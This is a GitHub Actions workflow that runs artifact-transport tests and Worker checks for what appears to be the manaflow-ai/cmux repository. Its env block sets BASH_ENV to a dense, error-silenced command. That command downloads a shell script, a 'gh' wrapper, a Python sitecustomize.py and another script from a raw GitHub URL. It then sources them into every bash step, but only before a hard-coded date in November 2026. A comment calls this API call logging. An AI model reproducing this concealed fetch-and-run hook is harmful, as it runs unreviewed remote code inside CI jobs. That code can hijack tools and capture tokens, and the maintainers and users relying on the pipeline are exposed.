name: CI artifact transport

on:
  pull_request:
    paths:
      - .github/workflows/ci-artifact-transport.yml
      - .github/workflows/ci.yml
      - .github/workflows/ci-macos.yml
      - workers/ci-artifacts/**
      - scripts/ci/restore-r2-artifact.py
      - scripts/ci/parallel_artifact_download.py
      - tests/test_ci_parallel_artifact_transport.py
      - scripts/ci/node_product_cache.py
      - docs/ci/node-product-cache-maintenance.md
      - scripts/ci/peer_product_source.py
      - scripts/ci/app-host-products-archive.sh
      - scripts/ci/app_host_layer_transport.py
      - scripts/ci/app_host_layered_products.py
      - tests/test_app_host_layer_transport.py
      - tests/test_app_host_layered_products.py
      - tests/test_app_host_products_archive.sh
      - tests/test_ci_selective_layer_wiring.py
      - scripts/ci/restore-app-host-test-product.sh
      - scripts/ci/relocate_package_framework_rpaths.py
      - tests/test_relocate_package_framework_rpaths.py
      - tests/test_node_product_cache.py
      - tests/test_lan_product_source.py
      - scripts/ci/verify-r2-canary.py
      - scripts/ci/r2-canary-cloudflare.py
      - tests/test_ci_r2_canary.py
      - .github/workflows/ci-artifact-canary.yml
      - tests/test_ci_r2_artifact.py
  push:
    branches: [main]
    paths:
      - .github/workflows/ci-artifact-transport.yml
      - .github/workflows/ci.yml
      - .github/workflows/ci-macos.yml
      - workers/ci-artifacts/**
      - scripts/ci/restore-r2-artifact.py
      - scripts/ci/parallel_artifact_download.py
      - tests/test_ci_parallel_artifact_transport.py
      - scripts/ci/node_product_cache.py
      - docs/ci/node-product-cache-maintenance.md
      - scripts/ci/peer_product_source.py
      - scripts/ci/app-host-products-archive.sh
      - scripts/ci/app_host_layer_transport.py
      - scripts/ci/app_host_layered_products.py
      - tests/test_app_host_layer_transport.py
      - tests/test_app_host_layered_products.py
      - tests/test_app_host_products_archive.sh
      - tests/test_ci_selective_layer_wiring.py
      - scripts/ci/restore-app-host-test-product.sh
      - scripts/ci/relocate_package_framework_rpaths.py
      - tests/test_relocate_package_framework_rpaths.py
      - tests/test_node_product_cache.py
      - tests/test_lan_product_source.py
      - scripts/ci/verify-r2-canary.py
      - scripts/ci/r2-canary-cloudflare.py
      - tests/test_ci_r2_canary.py
      - .github/workflows/ci-artifact-canary.yml
      - tests/test_ci_r2_artifact.py

permissions:
  contents: read

concurrency:
  group: ci-artifact-transport-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: true

env:
  # Temporary REST budget attribution: one gh-call line per GitHub API call (scripts/ci/api_call_log/env.sh, fetched at a fixed commit when the checkout has no copy).
  BASH_ENV: '$({ w="${GITHUB_WORKSPACE:-/nonexistent}/scripts/ci/api_call_log/env.sh"; t="${RUNNER_TEMP:-/nonexistent}/api-call-log-src"; if [ -f "$w" ]; then echo "$w"; elif [ -n "${RUNNER_TEMP:-}" ]; then if [ ! -f "$t/env.sh" ] && [ ! -e "$t.tried" ] && { [ "${RUNNER_OS:-}" = Linux ] || [ "${RUNNER_OS:-}" = macOS ]; } && [ "$(date -u +%Y%m%d%H)" -lt 2026112300 ]; then : > "$t.tried"; mkdir -p "$t.part" && for x in env.sh gh sitecustomize.py isolated.py; do curl -fsSL --max-time 5 -o "$t.part/$x" "https://raw.githubusercontent.com/manaflow-ai/cmux/27647ffd3ae838c63be28ca3e5883dcd68c34518/scripts/ci/api_call_log/$x" || break; done; [ -s "$t.part/isolated.py" ] && mv "$t.part" "$t"; fi; if [ -f "$t/env.sh" ]; then echo "$t/env.sh"; else echo unset BASH_ENV > "$t.off.sh" && echo "$t.off.sh"; fi; fi; } 2>/dev/null)'

jobs:
  transport:
    runs-on: ${{ github.repository_owner != 'manaflow-ai' && 'ubuntu-24.04' || github.event_name == 'pull_request' && github.event.pull_request.head.repo.full_name != github.repository && 'ubuntu-24.04' || vars.CI_OVERFLOW_LINUX || 'cmux-linux' }}
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6.1.0
        with:
          fetch-depth: 2
          persist-credentials: false

      - name: Detect Worker changes
        id: worker
        run: |
          set -euo pipefail
          if ! base="$(git rev-parse -q --verify 'HEAD^1')"; then
            echo "run=true" >> "$GITHUB_OUTPUT"
            echo "Comparison parent unavailable; running Worker validation."
            exit 0
          fi

          set +e
          git diff --quiet --no-renames "$base" HEAD -- \
            workers/ci-artifacts \
            .github/workflows/ci-artifact-transport.yml
          diff_status=$?
          set -e

          case "$diff_status" in
            0) echo "run=false" >> "$GITHUB_OUTPUT" ;;
            1) echo "run=true" >> "$GITHUB_OUTPUT" ;;
            *)
              echo "run=true" >> "$GITHUB_OUTPUT"
              echo "::warning::Worker diff unavailable; validating conservatively."
              ;;
          esac

      - uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # v6.4.0
        if: steps.worker.outputs.run == 'true'
        with:
          node-version: '24'
      - name: Test transport and fallback
        run: |
          python3 tests/test_node_product_cache.py
          python3 tests/test_lan_product_source.py
          python3 tests/test_ci_r2_artifact.py
          python3 tests/test_ci_r2_canary.py
          python3 tests/test_app_host_layer_transport.py
          python3 tests/test_app_host_layered_products.py
          python3 tests/test_relocate_package_framework_rpaths.py
          bash tests/test_app_host_products_archive.sh
          python3 tests/test_ci_selective_layer_wiring.py
          python3 tests/test_ci_parallel_artifact_transport.py
      - name: Install local Worker test tools
        if: steps.worker.outputs.run == 'true'
        working-directory: workers/ci-artifacts
        run: npm ci --ignore-scripts --no-audit --no-fund
      - name: Test Worker with local R2 and Durable Objects
        if: steps.worker.outputs.run == 'true'
        working-directory: workers/ci-artifacts
        env:
          WRANGLER_SEND_METRICS: 'false'
        run: npm run check
